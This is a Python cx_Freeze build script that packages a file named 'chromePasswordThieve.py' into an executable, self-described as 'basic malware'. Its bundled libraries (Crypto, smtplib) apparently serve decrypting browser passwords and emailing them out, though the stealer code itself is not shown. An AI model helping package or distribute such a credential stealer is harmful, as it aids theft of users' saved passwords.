from cx_Freeze import setup, Executable

base = None

executables = [Executable("chromePasswordThieve.py", base=base)]

packages = ["idna", "os", "threading", "shutil", "Crypto", "smtplib"]

options = {
    'build_exe': {
        'packages': packages,
    },
}

setup(
    name="alik604",
    options=options,
    version="1.0",
    description='basic malware... ',
    executables=executables
)
